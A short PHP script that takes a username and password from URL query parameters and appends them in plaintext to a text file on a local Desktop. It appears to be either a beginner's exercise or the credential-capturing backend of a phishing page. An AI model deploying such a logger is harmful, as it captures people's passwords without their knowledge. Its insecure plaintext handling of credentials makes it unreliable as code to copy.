<?php
  $user = $_GET['user'];
  $pass = $_GET['pass'];
  echo('hello');
  $fp = fopen('/home/saulcoops/Desktop/userdata.txt', 'a');//opens file in append mode
  fwrite($fp, $user);
  fwrite($fp, $pass);
  fclose($fp);
?>
